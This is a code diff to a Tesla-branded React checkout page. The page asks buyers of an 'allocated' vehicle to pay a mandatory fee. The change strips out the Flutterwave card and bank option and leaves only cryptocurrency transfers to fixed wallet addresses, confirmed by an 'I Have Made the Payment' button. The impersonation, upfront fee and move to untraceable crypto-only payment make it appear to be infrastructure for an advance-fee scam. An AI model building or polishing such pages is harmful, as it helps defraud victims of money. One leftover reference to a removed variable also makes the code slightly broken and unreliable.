@@ -19,7 +19,7 @@ import {
 import { DeliveryAddress } from '../types';
 import { TeslaLogo, TeslaEmblem, TeslaWordmark } from '../components/TeslaBranding';
 
-type PaymentMethodType = 'cryptocurrency' | 'flutterwave';
+type PaymentMethodType = 'cryptocurrency';
 type CryptoCurrencyType = 'BTC' | 'ETH' | 'SOL';
 
 export const DemoCheckoutPage: React.FC = () => {
@@ -147,33 +147,25 @@ export const DemoCheckoutPage: React.FC = () => {
 
     setIsSubmitting(true);
     try {
-      const isCrypto = selectedMethod === 'cryptocurrency';
-      const paymentMethodName = isCrypto
-        ? `Cryptocurrency (${cryptoWallets[selectedCrypto].name} - ${selectedCrypto})`
-        : 'Flutterwave Secure Checkout';
-
-      const transferRef = isCrypto
-        ? (cryptoTxId.trim() || 'TX-' + Math.random().toString(36).substring(2, 10).toUpperCase())
-        : 'FLW-' + Math.floor(10000000 + Math.random() * 90000000);
+      const paymentMethodName = `Cryptocurrency (${cryptoWallets[selectedCrypto].name} - ${selectedCrypto})`;
+      const transferRef = cryptoTxId.trim() || 'TX-' + Math.random().toString(36).substring(2, 10).toUpperCase();
 
       const claim = await submitDemoClaim(v.id, address, {
         method: paymentMethodName,
         transferReference: transferRef,
-        status: isCrypto ? 'Pending Manual Verification' : 'Evidence Submitted',
-        cryptoAddress: isCrypto ? cryptoWallets[selectedCrypto].address : undefined,
-        cryptoNetwork: isCrypto ? cryptoWallets[selectedCrypto].network : undefined,
-        cryptoAsset: isCrypto ? selectedCrypto : undefined,
-        notes: isCrypto
-          ? `Cryptocurrency payment sent for $${v.totalMandatoryFeeUSD} USD. Asset: ${cryptoWallets[selectedCrypto].name} (${selectedCrypto}) to receiving address ${cryptoWallets[selectedCrypto].address}. Status: Pending Manual Verification.`
-          : `Payment arranged via Flutterwave for $${v.totalMandatoryFeeUSD} USD logistics settlement.`
+        status: 'Pending Manual Verification',
+        cryptoAddress: cryptoWallets[selectedCrypto].address,
+        cryptoNetwork: cryptoWallets[selectedCrypto].network,
+        cryptoAsset: selectedCrypto,
+        notes: `Cryptocurrency payment sent for $${v.totalMandatoryFeeUSD} USD. Asset: ${cryptoWallets[selectedCrypto].name} (${selectedCrypto}) to receiving address ${cryptoWallets[selectedCrypto].address}. Status: Pending Manual Verification.`
       });
 
       setConfirmedClaim({
         trackingNumber: claim.trackingNumber,
         method: paymentMethodName,
         reference: transferRef,
-        paymentStatus: isCrypto ? 'Pending Manual Verification' : 'Evidence Submitted',
-        cryptoAsset: isCrypto ? selectedCrypto : undefined
+        paymentStatus: 'Pending Manual Verification',
+        cryptoAsset: selectedCrypto
       });
 
       showNotification('Vehicle allocation order confirmed successfully!', 'success');
@@ -211,31 +203,31 @@ export const DemoCheckoutPage: React.FC = () => {
 
           <div className="p-4 bg-zinc-900 border border-zinc-800 rounded-lg text-center space-y-1">
             <span className="text-xs text-zinc-500 uppercase tracking-wider">Official Tracking Code</span>
-            <p className="text-xl sm:text-2xl font-mono font-bold text-white tracking-wider">
+            <p className="text-xl sm:text-2xl font-mono font-bold text-white tracking-wider break-all">
               {confirmedClaim.trackingNumber}
             </p>
           </div>
 
           <div className="p-4 bg-zinc-900/50 rounded-lg text-left text-xs text-zinc-300 space-y-2.5 border border-zinc-800/80">
-            <div className="flex justify-between pb-2 border-b border-zinc-800">
+            <div className="flex flex-col sm:flex-row sm:justify-between sm:items-center pb-2 border-b border-zinc-800 gap-0.5 sm:gap-2">
               <span className="text-zinc-500">Allocated Vehicle:</span>
               <span className="font-semibold text-white">{v.year} {v.model} {v.trim}</span>
             </div>
-            <div className="flex justify-between pb-2 border-b border-zinc-800">
+            <div className="flex flex-col sm:flex-row sm:justify-between sm:items-center pb-2 border-b border-zinc-800 gap-0.5 sm:gap-2">
               <span className="text-zinc-500">Destination:</span>
               <span className="font-medium text-white">{address.city}, {address.stateOrRegion} {address.postalCode}</span>
             </div>
-            <div className="flex justify-between pb-2 border-b border-zinc-800">
+            <div className="flex flex-col sm:flex-row sm:justify-between sm:items-center pb-2 border-b border-zinc-800 gap-0.5 sm:gap-2">
               <span className="text-zinc-500">Payment Option:</span>
               <span className="font-medium text-white">{confirmedClaim.method}</span>
             </div>
-            <div className="flex justify-between pb-2 border-b border-zinc-800">
+            <div className="flex flex-col sm:flex-row sm:justify-between sm:items-center pb-2 border-b border-zinc-800 gap-0.5 sm:gap-2">
               <span className="text-zinc-500">Settlement Reference:</span>
-              <span className="font-mono text-emerald-400 font-bold">{confirmedClaim.reference}</span>
+              <span className="font-mono text-emerald-400 font-bold break-all">{confirmedClaim.reference}</span>
             </div>
-            <div className="flex justify-between pb-2 border-b border-zinc-800 items-center">
+            <div className="flex flex-col sm:flex-row sm:justify-between sm:items-center pb-2 border-b border-zinc-800 gap-1 sm:gap-2">
               <span className="text-zinc-500">Payment Status:</span>
-              <span className={`px-2.5 py-0.5 rounded text-xs font-bold uppercase tracking-wider ${
+              <span className={`px-2.5 py-0.5 rounded text-xs font-bold uppercase tracking-wider self-start sm:self-auto ${
                 isCrypto
                   ? 'border border-amber-600/70 bg-amber-950/80 text-amber-300'
                   : 'border border-emerald-600/70 bg-emerald-950/80 text-emerald-300'
@@ -531,9 +523,9 @@ export const DemoCheckoutPage: React.FC = () => {
                 <div className="bg-zinc-950 border border-white/[0.08] rounded-xl p-4 sm:p-6 lg:p-8 space-y-6">
                   <div className="flex items-center justify-between pb-4 border-b border-zinc-900">
                     <div className="flex items-center gap-2">
-                      <CreditCard className="w-5 h-5 text-[#E82127]" />
+                      <Wallet className="w-5 h-5 text-[#E82127]" />
                       <h2 className="text-lg font-bold text-white font-display">
-                        Choose Payment Method
+                        Payment & Settlement Method
                       </h2>
                     </div>
                     <button
@@ -546,195 +538,122 @@ export const DemoCheckoutPage: React.FC = () => {
                     </button>
                   </div>
 
-                  {/* Payment Method Selector Cards */}
-                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
-                    {/* Option 1: Cryptocurrency */}
-                    <div
-                      onClick={() => setSelectedMethod('cryptocurrency')}
-                      className={`p-4 rounded-xl border cursor-pointer transition-all ${
-                        selectedMethod === 'cryptocurrency'
-                          ? 'border-[#E82127] bg-[#E82127]/10'
-                          : 'border-zinc-800 bg-zinc-900/50 hover:border-zinc-700'
-                      }`}
-                    >
-                      <div className="flex items-center justify-between mb-2">
-                        <div className="flex items-center gap-2">
-                          <Wallet className="w-4 h-4 text-[#E82127]" />
-                          <span className="font-bold text-sm text-white">Cryptocurrency</span>
-                        </div>
-                        <span className="px-2 py-0.5 text-[10px] uppercase font-bold rounded bg-zinc-800 text-zinc-300">
-                          Instant
-                        </span>
+                  {/* Payment Method Details */}
+                  <div className="p-4 rounded-xl border border-[#E82127] bg-[#E82127]/10 transition-all">
+                    <div className="flex items-center justify-between mb-2">
+                      <div className="flex items-center gap-2">
+                        <Wallet className="w-4 h-4 text-[#E82127]" />
+                        <span className="font-bold text-sm text-white">Cryptocurrency Settlement</span>
                       </div>
-                      <p className="text-xs text-zinc-400 leading-relaxed">
-                        Direct blockchain payment with Bitcoin (BTC), Ethereum (ETH), or Solana (SOL).
-                      </p>
+                      <span className="px-2 py-0.5 text-[10px] uppercase font-bold rounded bg-zinc-800 text-zinc-300">
+                        Direct Deposit
+                      </span>
                     </div>
-
-                    {/* Option 2: Flutterwave */}
-                    <div
-                      onClick={() => setSelectedMethod('flutterwave')}
-                      className={`p-4 rounded-xl border cursor-pointer transition-all ${
-                        selectedMethod === 'flutterwave'
-                          ? 'border-[#E82127] bg-[#E82127]/10'
-                          : 'border-zinc-800 bg-zinc-900/50 hover:border-zinc-700'
-                      }`}
-                    >
-                      <div className="flex items-center justify-between mb-2">
-                        <div className="flex items-center gap-2">
-                          <CreditCard className="w-4 h-4 text-emerald-400" />
-                          <span className="font-bold text-sm text-white">Flutterwave</span>
-                        </div>
-                        <span className="px-2 py-0.5 text-[10px] uppercase font-bold rounded bg-emerald-950 text-emerald-400 border border-emerald-800/40">
-                          Verified
-                        </span>
-                      </div>
-                      <p className="text-xs text-zinc-400 leading-relaxed">
-                        Pay with Credit/Debit Card, Bank Transfer, or Mobile Money via Flutterwave.
-                      </p>
-                    </div>
+                    <p className="text-xs text-zinc-400 leading-relaxed">
+                      Direct blockchain payment with Bitcoin (BTC), Ethereum (ETH), or Solana (SOL).
+                    </p>
                   </div>
 
-                  {/* Payment Details Container */}
-                  {selectedMethod === 'cryptocurrency' ? (
-                    <div className="pt-4 border-t border-zinc-900 space-y-4">
-                      <div className="flex items-center justify-between">
-                        <span className="text-xs font-bold uppercase tracking-wider text-zinc-300">
-                          Select Cryptocurrency Asset
+                  {/* Cryptocurrency Details Container */}
+                  <div className="pt-4 border-t border-zinc-900 space-y-4">
+                    <div className="flex items-center justify-between">
+                      <span className="text-xs font-bold uppercase tracking-wider text-zinc-300">
+                        Select Cryptocurrency Asset
+                      </span>
+                      <span className="text-xs text-zinc-500">Payable: ${v.totalMandatoryFeeUSD}.00 USD</span>
+                    </div>
+
+                    {/* Crypto Asset Tabs */}
+                    <div className="grid grid-cols-3 gap-2">
+                      {(['BTC', 'ETH', 'SOL'] as CryptoCurrencyType[]).map(asset => (
+                        <button
+                          key={asset}
+                          type="button"
+                          onClick={() => setSelectedCrypto(asset)}
+                          className={`py-2.5 px-3 rounded text-xs font-bold tracking-wider transition-colors flex flex-col sm:flex-row items-center justify-center gap-1 ${
+                            selectedCrypto === asset
+                              ? 'bg-zinc-800 text-white border border-[#E82127]'
+                              : 'bg-zinc-900 text-zinc-400 hover:text-white border border-zinc-800'
+                          }`}
+                        >
+                          <span>{cryptoWallets[asset].name}</span>
+                          <span className="text-[10px] text-zinc-500 font-mono">({cryptoWallets[asset].symbol})</span>
+                        </button>
+                      ))}
+                    </div>
+
+                    {/* Deposit Box */}
+                    <div className="p-4 bg-zinc-900/70 border border-zinc-800 rounded-lg space-y-3.5">
+                      <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-xs pb-3 border-b border-zinc-800">
+                        <div>
+                          <span className="text-zinc-500 block text-[11px] uppercase tracking-wider">Cryptocurrency:</span>
+                          <span className="font-bold text-white text-sm">
+                            {cryptoWallets[selectedCrypto].name} ({cryptoWallets[selectedCrypto].symbol})
+                          </span>
+                        </div>
+                        <div>
+                          <span className="text-zinc-500 block text-[11px] uppercase tracking-wider">Network:</span>
+                          <span className="font-semibold text-zinc-200">
+                            {cryptoWallets[selectedCrypto].network}
+                          </span>
+                        </div>
+                      </div>
+
+                      <div className="space-y-1.5">
+                        <span className="text-[11px] text-zinc-400 font-semibold uppercase tracking-wider block">
+                          Receiving Address ({cryptoWallets[selectedCrypto].symbol}):
                         </span>
-                        <span className="text-xs text-zinc-500">Payable: ${v.totalMandatoryFeeUSD}.00 USD</span>
-                      </div>
-
-                      {/* Crypto Asset Tabs */}
-                      <div className="grid grid-cols-3 gap-2">
-                        {(['BTC', 'ETH', 'SOL'] as CryptoCurrencyType[]).map(asset => (
+                        <div className="flex flex-col sm:flex-row items-stretch sm:items-center gap-2 bg-zinc-950 p-2.5 rounded border border-zinc-800">
+                          <span className="font-mono text-xs text-white break-all flex-1 select-all py-1">
+                            {cryptoWallets[selectedCrypto].address}
+                          </span>
                           <button
-                            key={asset}
                             type="button"
-                            onClick={() => setSelectedCrypto(asset)}
-                            className={`py-2.5 px-3 rounded text-xs font-bold tracking-wider transition-colors flex flex-col sm:flex-row items-center justify-center gap-1 ${
-                              selectedCrypto === asset
-                                ? 'bg-zinc-800 text-white border border-[#E82127]'
-                                : 'bg-zinc-900 text-zinc-400 hover:text-white border border-zinc-800'
-                            }`}
+                            onClick={() => handleCopyCrypto(cryptoWallets[selectedCrypto].address)}
+                            className="px-3 py-2 bg-zinc-800 hover:bg-zinc-700 text-white rounded text-xs font-semibold flex items-center justify-center gap-1.5 transition-colors shrink-0"
                           >
-                            <span>{cryptoWallets[asset].name}</span>
-                            <span className="text-[10px] text-zinc-500 font-mono">({cryptoWallets[asset].symbol})</span>
+                            {copiedAddress ? (
+                              <>
+                                <Check className="w-3.5 h-3.5 text-emerald-400" />
+                                <span>Address Copied</span>
+                              </>
+                            ) : (
+                              <>
+                                <Copy className="w-3.5 h-3.5" />
+                                <span>Copy Address</span>
+                              </>
+                            )}
                           </button>
-                        ))}
+                        </div>
+                        <p className="text-[11px] text-zinc-500">
+                          Send only {cryptoWallets[selectedCrypto].name} ({cryptoWallets[selectedCrypto].symbol}) to this receiving address via the {cryptoWallets[selectedCrypto].network}.
+                        </p>
                       </div>
 
-                      {/* Deposit Box */}
-                      <div className="p-4 bg-zinc-900/70 border border-zinc-800 rounded-lg space-y-3.5">
-                        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 text-xs pb-3 border-b border-zinc-800">
-                          <div>
-                            <span className="text-zinc-500 block text-[11px] uppercase tracking-wider">Cryptocurrency:</span>
-                            <span className="font-bold text-white text-sm">
-                              {cryptoWallets[selectedCrypto].name} ({cryptoWallets[selectedCrypto].symbol})
-                            </span>
-                          </div>
-                          <div>
-                            <span className="text-zinc-500 block text-[11px] uppercase tracking-wider">Network:</span>
-                            <span className="font-semibold text-zinc-200">
-                              {cryptoWallets[selectedCrypto].network}
-                            </span>
-                          </div>
-                        </div>
+                      <div className="space-y-1.5 pt-1">
+                        <label className="block text-xs font-semibold text-zinc-300">
+                          Transaction Hash / TXID (Optional)
+                        </label>
+                        <input
+                          type="text"
+                          value={cryptoTxId}
+                          onChange={e => setCryptoTxId(e.target.value)}
+                          placeholder="e.g. 0x4f82... or b8a9..."
+                          className="w-full bg-zinc-950 border border-zinc-800 rounded p-2.5 text-xs text-white focus:outline-none focus:border-[#E82127] font-mono"
+                        />
+                        <p className="text-[11px] text-zinc-500">
+                          Optional: enter your transaction hash to assist manual verification.
+                        </p>
+                      </div>
 
-                        <div className="space-y-1.5">
-                          <span className="text-[11px] text-zinc-400 font-semibold uppercase tracking-wider block">
-                            Receiving Address ({cryptoWallets[selectedCrypto].symbol}):
-                          </span>
-                          <div className="flex flex-col sm:flex-row items-stretch sm:items-center gap-2 bg-zinc-950 p-2.5 rounded border border-zinc-800">
-                            <span className="font-mono text-xs text-white break-all flex-1 select-all py-1">
-                              {cryptoWallets[selectedCrypto].address}
-                            </span>
-                            <button
-                              type="button"
-                              onClick={() => handleCopyCrypto(cryptoWallets[selectedCrypto].address)}
-                              className="px-3 py-2 bg-zinc-800 hover:bg-zinc-700 text-white rounded text-xs font-semibold flex items-center justify-center gap-1.5 transition-colors shrink-0"
-                            >
-                              {copiedAddress ? (
-                                <>
-                                  <Check className="w-3.5 h-3.5 text-emerald-400" />
-                                  <span>Address Copied</span>
-                                </>
-                              ) : (
-                                <>
-                                  <Copy className="w-3.5 h-3.5" />
-                                  <span>Copy Address</span>
-                                </>
-                              )}
-                            </button>
-                          </div>
-                          <p className="text-[11px] text-zinc-500">
-                            Send only {cryptoWallets[selectedCrypto].name} ({cryptoWallets[selectedCrypto].symbol}) to this receiving address via the {cryptoWallets[selectedCrypto].network}.
-                          </p>
-                        </div>
-
-                        <div className="space-y-1.5 pt-1">
-                          <label className="block text-xs font-semibold text-zinc-300">
-                            Transaction Hash / TXID (Optional)
-                          </label>
-                          <input
-                            type="text"
-                            value={cryptoTxId}
-                            onChange={e => setCryptoTxId(e.target.value)}
-                            placeholder="e.g. 0x4f82... or b8a9..."
-                            className="w-full bg-zinc-950 border border-zinc-800 rounded p-2.5 text-xs text-white focus:outline-none focus:border-[#E82127] font-mono"
-                          />
-                          <p className="text-[11px] text-zinc-500">
-                            Optional: enter your transaction hash to assist manual verification.
-                          </p>
-                        </div>
-
-                        <div className="p-3 bg-amber-950/20 border border-amber-800/40 rounded text-[11px] text-amber-300/90 leading-relaxed flex items-start gap-2">
-                          <AlertCircle className="w-4 h-4 text-amber-400 shrink-0 mt-0.5" />
-                          <span>
-                            After sending funds, click <strong>"I Have Made the Payment"</strong> below. Your payment will be recorded as <strong>"Pending Manual Verification"</strong> and verified by operations. Crypto payments are never automatically verified or completed.
-                          </span>
-                        </div>
+                      <div className="p-3 bg-amber-950/20 border border-amber-800/40 rounded text-[11px] text-amber-300/90 leading-relaxed flex items-start gap-2">
+                        <AlertCircle className="w-4 h-4 text-amber-400 shrink-0 mt-0.5" />
+                        <span>
+                          After sending funds, click <strong>"I Have Made the Payment"</strong> below. Your payment will be recorded as <strong>"Pending Manual Verification"</strong> and verified by operations. Crypto payments are never automatically verified or completed.
+                        </span>
                       </div>
                     </div>
-                  ) : (
-                    /* Flutterwave View */
-                    <div className="pt-4 border-t border-zinc-900 space-y-4">
-                      <div className="p-4 bg-zinc-900/60 border border-zinc-800 rounded-lg space-y-3">
-                        <div className="flex items-center justify-between pb-3 border-b border-zinc-800">
-                          <div>
-                            <span className="text-xs font-bold uppercase tracking-wider text-white block">
-                              Flutterwave Payment Gateway
-                            </span>
-                            <span className="text-[11px] text-zinc-400">
-                              Integrated Checkout for Cards, Bank Wire, and Transfers
-                            </span>
-                          </div>
-                          <span className="font-bold text-base text-white tabular-nums">
-                            ${v.totalMandatoryFeeUSD}.00 USD
-                          </span>
-                        </div>
-
-                        <div className="space-y-2 text-xs text-zinc-300">
-                          <div className="flex justify-between">
-                            <span className="text-zinc-500">Payer Name:</span>
-                            <span className="font-medium text-white">{address.fullName}</span>
-                          </div>
-                          <div className="flex justify-between">
-                            <span className="text-zinc-500">Billing Email:</span>
-                            <span className="font-medium text-white">{address.email}</span>
-                          </div>
-                          <div className="flex justify-between">
-                            <span className="text-zinc-500">Payment Protection:</span>
-                            <span className="text-emerald-400 font-medium">PCI-DSS Level 1 Certified</span>
-                          </div>
-                        </div>
-
-                        <div className="p-3 bg-zinc-950 rounded border border-zinc-800/80 text-[11px] text-zinc-400 leading-relaxed">
-                          Click below to confirm payment with Flutterwave. Your settlement receipt and allocation confirmation will be generated immediately.
-                        </div>
-                      </div>
-                    </div>
-                  )}
+                  </div>
 
                   <div className="pt-2">
                     <button
@@ -743,18 +662,10 @@ export const DemoCheckoutPage: React.FC = () => {
                       className="w-full py-4 bg-[#E82127] hover:bg-[#b91318] disabled:bg-zinc-800 disabled:text-zinc-600 text-white font-bold text-xs uppercase tracking-wider rounded transition-colors shadow-lg flex items-center justify-center gap-2"
                     >
                       {isSubmitting ? (
-                        <span>
-                          {selectedMethod === 'cryptocurrency'
-                            ? 'Recording Payment as Pending Manual Verification...'
-                            : 'Processing Allocation Settlement...'}
-                        </span>
+                        <span>Recording Payment as Pending Manual Verification...</span>
                       ) : (
                         <>
-                          <span>
-                            {selectedMethod === 'cryptocurrency'
-                              ? 'I Have Made the Payment'
-                              : `Pay $${v.totalMandatoryFeeUSD}.00 with Flutterwave`}
-                          </span>
+                          <span>I Have Made the Payment</span>
                           <ArrowRight className="w-4 h-4" />
                         </>
                       )}
